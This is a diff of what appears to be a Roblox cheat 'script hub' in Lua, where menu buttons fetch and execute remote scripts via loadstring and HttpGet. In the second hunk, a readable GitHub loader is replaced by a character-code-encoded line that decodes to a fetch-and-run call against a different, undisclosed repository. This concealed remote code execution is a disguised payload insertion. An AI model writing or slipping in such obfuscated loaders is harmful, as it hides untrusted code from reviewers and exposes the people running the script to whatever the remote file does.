@@ -2112,7 +2112,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/mai
 end)
 
 about:Button("背上只因剑2",function()
-loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
+loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'))()
 end)
 
 local UITab46 = win:Tab("『彩虹朋友』",'7734068321')
@@ -2637,5 +2637,5 @@ local UITab75 = win:Tab("『被遗弃』",'7734068321')
 
 local about = UITab75:section("『被遗弃』",true)
 about:Button("『被遗弃』",function()
-loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/SilkScripts/AppleStuff/refs/heads/main/AppleFSKV2")))()
+loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
 end)
